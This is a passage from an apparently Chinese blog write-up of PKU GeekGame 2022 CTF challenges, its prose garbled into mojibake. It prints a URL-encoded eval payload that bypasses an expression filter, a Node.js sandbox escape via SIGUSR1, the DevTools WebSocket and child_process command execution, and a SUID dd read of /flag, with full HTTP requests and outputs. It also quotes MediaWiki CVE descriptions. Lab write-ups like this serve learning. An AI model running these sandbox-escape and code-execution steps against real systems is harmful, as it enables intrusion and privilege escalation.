<span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>è¯•äº†è¯• <code>i_am_premium_user</code> ä½œä¸º activation codeï¼Œç„¶è€Œå‘ç°å¹¶æ²¡æœ‰ç”¨</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124041554519.png"></p>
<p>çœ‹èµ·æ¥è¿™ä¸ªåº”è¯¥è¿˜æ˜¯åœ¨é‚£å †æ··æ·†çš„ js é‡Œã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"i_am_premium_user"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ²¡å•¥ç”¨çš„æ„Ÿè§‰ï¼ˆ</p>
<p>è¿˜æ˜¯çœ‹åç«¯ç„¶åè¯•ç€å‘åŒ…å§ã€‚</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124044009038.png"></p>
<p>å“ˆå“ˆï¼Œä¸èƒ½ç›´æ¥è¯» flag</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124042454404.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124045007141.png"></p>
<p>çœ‹èµ·æ¥æ˜¯æŠŠåŒ…å« flag çš„åœ°æ–¹ç›´æ¥ replace æ‰äº†</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124045134965.png"></p>
<p>å””ï¼Œçœ‹èµ·æ¥é¡µé¢é‡Œçš„ flag å˜é‡å°±æ˜¯è¿™ä¸ªï¼Œé‚£åº”è¯¥è¿˜æœ‰ç‚¹åˆ«çš„ä¸œè¥¿ï¼Œè¿˜æ˜¯å¾— <strong>è¯» head éƒ¨åˆ†çš„æºç </strong> äº†ã€‚</p>
<p><em>ä¸æ‡‚äº†.jpg</em></p>
<p>èµ›åæ‰çŸ¥é“ï¼ŒåŸæ¥å¯ä»¥ç”¨ æ­£åˆ™è¡¨è¾¾å¼ ç»“åˆ url ç¼–ç ï¼ˆunescapeï¼‰æ¥ç»•è¿‡è¿™ä¸ªåŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆ<code>^([a-z0-9+\\-*/%(), ]|([0-9]+[.])+[0-9]+)+$</code>ï¼‰</p>
<p>è¿™ä¸ª poc æ¥è‡ª <a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-2nd/blob/master/official_writeup/ultimatesandbox/sol/poc.mjs">å®˜æ–¹è§£æ³•</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">flag{.+}</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">function</span> <span class="token function">generatePayload</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">eval(unescape(/%2f%0a</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token punctuation">[</span><span class="token operator">...</span>code<span class="token punctuation">]</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token string">'%'</span> <span class="token operator">+</span> _<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">%2f/))</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span>

<span class="token comment">// payload:</span>
<span class="token comment">// eval(unescape(/%2f%0a%2f%66%6c%61%67%7b%2e%2b%7d%2f%2e%65%78%65%63%28%64%6f%63%75%6d%65%6e%74%2e%71%75%65%72%79%53%65%6c%65%63%74%6f%72%28%27%73%63%72%69%70%74%27%29%2e%69%6e%6e%65%72%54%65%78%74%29%5b%30%5d%2f/))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231185923655.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/submit</span> <span class="token http-version property">HTTP/2</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">prob09-h5rdr7ox.geekgame.pku.edu.cn</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://prob09-manager.geekgame.pku.edu.cn/</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">243</span></span>
<span class="token application-json">
<span class="token punctuation">{</span><span class="token property">"expr"</span><span class="token operator">:</span><span class="token string">"eval(unescape(/%2f%0a%2f%66%6c%61%67%7b%2e%2b%7d%2f%2e%65%78%65%63%28%64%6f%63%75%6d%65%6e%74%2e%71%75%65%72%79%53%65%6c%65%63%74%6f%72%28%27%73%63%72%69%70%74%27%29%2e%69%6e%6e%65%72%54%65%78%74%29%5b%30%5d%2f/))"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"browser"</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>flag{reg3x_byp4ss_made_easy}</code></p>
<h4 id="Flag-Â·-çƒ‚"><a href="#Flag-Â·-çƒ‚" class="headerlink" title="Flag Â· çƒ‚"></a>Flag Â· çƒ‚</h4><p>è¿™ä¸ª flag éœ€è¦å€ŸåŠ© Node.JS æ²™ç®±ï¼Œå–µå–µä¸ä¼šå•Šï¼Œæ‘†çƒ‚äº†ï¼Œè¿™é‡Œå°±çº¯å¤ç° wp äº†</p>
<blockquote>
<p>Node.JS æ²™ç®±è¿è¡Œåœ¨ esm æ¨¡å¼ä¸‹ï¼Œå¹¶é€šè¿‡ policy ç¦ç”¨äº†<code>import</code>å¤–éƒ¨åŒ…ã€‚ä½†æˆ‘ä»¬ä»ç„¶èƒ½è®¿é—®<code>process</code>å¯¹è±¡ã€‚</p>
<p>å½“ä¸€ä¸ª<code>Node.JS</code>è¿›ç¨‹æ”¶åˆ°<code>SIGUSR1</code>ä¿¡å·æ—¶ä¼šè¿›å…¥è°ƒè¯•æ¨¡å¼ï¼Œå¹¶åœ¨<code>127.0.0.1:9229</code>å¤„æš´éœ²ä¸€ä¸ª<code>DevTools API</code>ã€‚æˆ‘ä»¬å…ˆä½¿ç”¨<code>process.kill</code>å‘æ²™ç®±çš„çˆ¶è¿›ç¨‹ï¼Œä¹Ÿå³åç«¯ä¸»è¿›ç¨‹å‘é€ä¿¡å·ï¼Œåœ¨ Node.JS æ²™ç®±é‡Œä½¿ç”¨ fetch å»è·å–å…·ä½“çš„ ws Endpointï¼Œç„¶åé€šè¿‡ Chrome æ²™ç®±å»è¿æ¥è¿™ä¸ª Endpointï¼Œå°±èƒ½åœ¨åç«¯ä¸»è¿›ç¨‹çš„ä¸Šä¸‹æ–‡é‡Œè¿è¡Œä»£ç â€”â€”è¿™ä¸€æ¬¡å°†å¯ä»¥ä½¿ç”¨<code>require</code>æ¥åŠ è½½å¤–éƒ¨åŒ…ï¼Œä»è€Œå®ç° RCEã€‚</p>
<p>ç»§è€Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>find</code>å‘½ä»¤ç­‰æ‰‹æ®µå¯»æ‰¾å…·æœ‰ suid æƒé™çš„äºŒè¿›åˆ¶ï¼ˆæœ¬é¢˜ä¸­ä¸º<code>dd</code>ï¼‰ï¼Œå¹¶ä½¿ç”¨å…¶è¯»å– flag æ–‡ä»¶ã€‚</p>
<blockquote>
<p>è¿™ä¸ª flag çš„çµæ„Ÿæ¥æºäº Node.JS æ–°çš„<a target="_blank" rel="noopener" href="https://nodejs.org/api/permissions.html">Permissions API</a>ã€‚ä½†å°±ç®—ç”¨äº†è¿™ä¸ª APIï¼ŒNode.JS æ²™ç®±ä¾ç„¶éå¸¸å±é™©ã€‚</p>
</blockquote>
</blockquote>
<p><em>ï¼ˆæ‚¨ä»¬çœŸä¼šç©å•Š</em></p>
<p>å…ˆæ‰§è¡Œ <code>process.kill(process.ppid, 'SIGUSR1')</code>ï¼Œè®©æ²™ç®±çš„çˆ¶è¿›ç¨‹è¿›å…¥è°ƒè¯•æ¨¡å¼</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"expr"</span><span class="token operator">:</span><span class="token string">"eval(unescape(/%2f%0a%70%72%6f%63%65%73%73%2e%6b%69%6c%6c%28%70%72%6f%63%65%73%73%2e%70%70%69%64%2c%20%27%53%49%47%55%53%52%31%27%29%2f/))"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"node"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231190740848.png"></p>
<p>ç„¶åè·å– DevTools API</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231190833973.png"></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:9229/json/list'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span><span class="token string-property property">"expr"</span><span class="token operator">:</span><span class="token string">"eval(unescape(/%2f%0a%66%65%74%63%68%28%27%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%39%32%32%39%2f%6a%73%6f%6e%2f%6c%69%73%74%27%29%2e%74%68%65%6e%28%72%65%73%20%3d%3e%20%72%65%73%2e%74%65%78%74%28%29%29%2f/))"</span><span class="token punctuation">,</span><span class="token string-property property">"mode"</span><span class="token operator">:</span><span class="token string">"node"</span><span class="token punctuation">}</span>


<span class="token punctuation">[</span> <span class="token punctuation">{</span>
  <span class="token string-property property">"description"</span><span class="token operator">:</span> <span class="token string">"node.js instance"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"devtoolsFrontendUrl"</span><span class="token operator">:</span> <span class="token string">"devtools://devtools/bundled/js_app.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:9229/868794b9-884f-4f32-92c4-8934031e2c38"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"devtoolsFrontendUrlCompat"</span><span class="token operator">:</span> <span class="token string">"devtools://devtools/bundled/inspector.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:9229/868794b9-884f-4f32-92c4-8934031e2c38"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"faviconUrl"</span><span class="token operator">:</span> <span class="token string">"https://nodejs.org/static/images/favicons/favicon.ico"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"868794b9-884f-4f32-92c4-8934031e2c38"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"title"</span><span class="token operator">:</span> <span class="token string">"backend/index.js"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"node"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"url"</span><span class="token operator">:</span> <span class="token string">"file:///app/backend/index.js"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"webSocketDebuggerUrl"</span><span class="token operator">:</span> <span class="token string">"ws://127.0.0.1:9229/868794b9-884f-4f32-92c4-8934031e2c38"</span>
<span class="token punctuation">}</span> <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨ browser ç«¯ï¼Œå€ŸåŠ© WebSocket è¿æ¥è¿™ä¸ª webSocketDebuggerUrlï¼Œrequire è·å–å¤–éƒ¨åŒ… child_process æ¥æ‰§è¡Œå‘½ä»¤</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'ws://127.0.0.1:9229/868794b9-884f-4f32-92c4-8934031e2c38'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">res</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
      <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'Runtime.evaluate'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">params</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">expression</span><span class="token operator">:</span> <span class="token string">"require('child_process').execSync('ls -al /').toString()"</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é¡ºä¾¿ï¼Œçœ‹ä¸‹æ‰¾ææƒçš„è¿‡ç¨‹</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> -al /
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">65</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 <span class="token builtin class-name">.</span>
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">65</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 <span class="token punctuation">..</span>
-rwxr-xr-x   <span class="token number">1</span> root root    <span class="token number">0</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 .dockerenv
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">21</span> Nov <span class="token number">12</span> 05:14 app
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">16</span> Nov <span class="token number">12</span> 05:13 bin
drwxr-xr-x   <span class="token number">2</span> root root    <span class="token number">6</span> Sep  <span class="token number">3</span> <span class="token number">12</span>:10 boot
drwxr-xr-x   <span class="token number">5</span> root root  <span class="token number">340</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 dev
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">66</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 etc
-r--r--r--   <span class="token number">1</span> root root   <span class="token number">35</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 flag
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">22</span> Nov <span class="token number">12</span> 05:14 home
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">86</span> Nov <span class="token number">12</span> 05:13 lib
drwxr-xr-x   <span class="token number">2</span> root root   <span class="token number">34</span> Oct <span class="token number">24</span> 00:00 lib64
drwxr-xr-x   <span class="token number">2</span> root root    <span class="token number">6</span> Oct <span class="token number">24</span> 00:00 media
drwxr-xr-x   <span class="token number">2</span> root root    <span class="token number">6</span> Oct <span class="token number">24</span> 00:00 mnt
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">20</span> Nov <span class="token number">12</span> 05:13 opt
dr-xr-xr-x <span class="token number">689</span> root root    <span class="token number">0</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 proc
drwx------   <span class="token number">1</span> root root   <span class="token number">18</span> Nov  <span class="token number">8</span> <span class="token number">18</span>:29 root
drwxr-xr-x   <span class="token number">3</span> root root   <span class="token number">30</span> Oct <span class="token number">24</span> 00:00 run
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">25</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 sbin
drwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 sock
drwxr-xr-x   <span class="token number">2</span> root root    <span class="token number">6</span> Oct <span class="token number">24</span> 00:00 srv
dr-xr-xr-x  <span class="token number">13</span> root root    <span class="token number">0</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 sys
drwxrwxrwt   <span class="token number">1</span> root root   <span class="token number">65</span> Dec <span class="token number">31</span> <span class="token number">11</span>:16 tmp
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">96</span> Oct <span class="token number">24</span> 00:00 usr
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">17</span> Oct <span class="token number">24</span> 00:00 var

$ <span class="token function">find</span> /bin -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
/bin/dd
/bin/mount
/bin/su
/bin/umount<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ€åç”¨ dd æ¥è¯» flag</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/dd <span class="token assign-left variable">if</span><span class="token operator">=</span>/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231191513445.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/submit</span> <span class="token http-version property">HTTP/2</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">prob09-h5rdr7ox.geekgame.pku.edu.cn</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://prob09-manager.geekgame.pku.edu.cn/</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1236</span></span>
<span class="token application-json">
<span class="token punctuation">{</span><span class="token property">"expr"</span><span class="token operator">:</span><span class="token string">"eval(unescape(/%2f%0a%0a%6e%65%77%20%50%72%6f%6d%69%73%65%28%72%65%73%20%3d%3e%20%7b%0a%20%20%63%6f%6e%73%74%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%39%32%32%39%2f%38%36%38%37%39%34%62%39%2d%38%38%34%66%2d%34%66%33%32%2d%39%32%63%34%2d%38%39%33%34%30%33%31%65%32%63%33%38%27%29%3b%0a%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%28%29%20%3d%3e%20%7b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%28%65%29%20%3d%3e%20%7b%0a%20%20%20%20%20%20%72%65%73%28%65%2e%64%61%74%61%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%7b%0a%20%20%20%20%20%20%69%64%3a%20%31%2c%0a%20%20%20%20%20%20%6d%65%74%68%6f%64%3a%20%27%52%75%6e%74%69%6d%65%2e%65%76%61%6c%75%61%74%65%27%2c%0a%20%20%20%20%20%20%70%61%72%61%6d%73%3a%20%7b%0a%20%20%20%20%20%20%20%20%65%78%70%72%65%73%73%69%6f%6e%3a%20%22%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%2f%62%69%6e%2f%64%64%20%69%66%3d%2f%66%6c%61%67%27%29%2e%74%6f%53%74%72%69%6e%67%28%29%22%0a%20%20%20%20%20%20%7d%2c%0a%20%20%20%20%7d%29%29%3b%0a%20%20%7d%3b%0a%7d%29%0a%20%20%2f/))"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"browser"</span><span class="token punctuation">}</span>


<span class="token punctuation">{</span><span class="token property">"result"</span><span class="token operator">:</span><span class="token string">"{\"id\":1,\"result\":{\"result\":{\"type\":\"string\",\"value\":\"flag{nOde_sANdbox_1s_alwaYs_risky}\\n\"}}}"</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<blockquote>
<p><a target="_blank" rel="noopener" href="http://nodejs.cn/api-v12/policy.html">Node.js policy å®‰å…¨ç­–ç•¥</a></p>
</blockquote>
<h3 id="ç§æœ‰ç¬”è®°"><a href="#ç§æœ‰ç¬”è®°" class="headerlink" title="ç§æœ‰ç¬”è®°"></a>ç§æœ‰ç¬”è®°</h3><blockquote>
<p>å¤§å®¶æˆ–è®¸åšè¿‡ Hackergame 2022 â€œFlag çš„ç—•è¿¹â€ä¸€é¢˜ï¼Œæˆ–è®¸æ²¡åšè¿‡ï¼Œè¿™ä¸é‡è¦ã€‚</p>
<p>æ€»ä¹‹ï¼Œç°åœ¨2020å¹´å° Z åœ¨è‡ªå·±çš„æœºå™¨ä¸Šéƒ¨ç½²äº†ä¸€ä¸ª MediaWiki ç”¨äºè®°å½•è‡ªå·±çš„ç¬”è®°ï¼ŒæŠŠ Flag æ”¾åœ¨é‡Œé¢ï¼Œç„¶åæƒ³æ–¹è®¾æ³•ä¸è®©å…¶ä»–äººçœ‹åˆ°ã€‚ ä½†æ˜¯ï¼Œè¿™æ¬¡ä¸ä»… Flag è¢«æ³„æ¼äº†ï¼Œé»‘å®¢è¿˜åœ¨æœºå™¨ä¸Šå¹²äº†æ›´å¤šåäº‹â€¦â€¦</p>
<p>ä¸€äº›è¯´æ˜ï¼š</p>
<ol>
<li>æ­¤é¢˜å’Œ Hackergame çš„é¢˜ç›®è§£æ³•æ²¡æœ‰ç›´æ¥è”ç³»ã€‚</li>
<li>æ­¤é¢˜ä¸æ˜¯ä»£ç å®¡è®¡é¢˜ï¼Œä¸€å¼€å§‹å°±é˜…è¯»æºä»£ç æ˜¯é”™è¯¯çš„é€‰æ‹©ã€‚</li>
</ol>
<p> ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://prob07-manager.geekgame.pku.edu.cn/docker-manager/start?xxxx">è®¿é—®é¢˜ç›®ç½‘é¡µ</a></p>
</blockquote>
<h4 id="çŸ¥è¯†ï¼Œä¸ä½ åˆ†äº«"><a href="#çŸ¥è¯†ï¼Œä¸ä½ åˆ†äº«" class="headerlink" title="çŸ¥è¯†ï¼Œä¸ä½ åˆ†äº«"></a>çŸ¥è¯†ï¼Œä¸ä½ åˆ†äº«</h4><p>è®¿é—® /index.php/ç‰¹æ®Š:ç‰ˆæœ¬</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124052728908.png"></p>
<p>MediaWiki  1.34.4</p>
<p>è€ç‰ˆæœ¬äº†ï¼Œå¤§æ¦‚ç‡æœ‰ CVEï¼Œè¦ä¸ç„¶å°±æ˜¯å“ªå®¶æ’ä»¶é”…äº†èƒ½ RCE ä¹‹ç±»çš„ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/2021-12_security_release/FAQ">https://www.mediawiki.org/wiki/2021-12_security_release/FAQ</a></p>
<p>ï¼ˆä¸­æ–‡ï¼š<a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/2021-12_security_release/FAQ/zh">https://www.mediawiki.org/wiki/2021-12_security_release/FAQ/zh</a></p>
<blockquote>
<ul>
<li>CVE-2021-44858: The â€œundoâ€ feature (<code>action=edit&amp;undo=##&amp;undoafter=###</code>) allowed an attacker to view the contents of arbitrary revisions,  regardless of whether they had permissions to do so. This was also found in the â€œmcrundoâ€ and â€œmcrrestoreâ€ actions (<code>action=mcrundo</code> and <code>action=mcrrestore</code>).</li>
<li>CVE-2021-45038: The â€œrollbackâ€ feature (<code>action=rollback</code>) could be passed a specially crafted parameter that allowed an attacker  to view the contents of arbitrary pages, regardless of whether they had  permissions to do so.</li>
<li>CVE-2021-44857: The â€œmcrundoâ€ and â€œmcrrestoreâ€ actions (<code>action=mcrundo</code> and <code>action=mcrrestore</code>) did not properly check for editing permissions, and allowed an attacker to take the content of any arbitrary revision and save it on any page  of their choosing. This affects both public wikis and public pages on  private wikis.</li>
</ul>
</blockquote>
<p>å¦‚æœæ˜¯ç§æœ‰ wiki ç«™ç‚¹ï¼Œè€Œä¸”åœ¨<code>$wgWhitelistRead</code>å’Œ<code>$wgWhitelistReadRegexp</code>è®¾ç½®æœ‰é¡µé¢ï¼ˆä¹Ÿå°±æ˜¯ <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Manual:$wgWhitelistRead/zh">ä¸€äº›åŒ¿åç”¨æˆ·èƒ½å¤Ÿé˜…è¯»çš„é¡µé¢</a>ï¼‰ï¼Œé‚£å°±ä¼šå—å½±å“ã€‚</p>
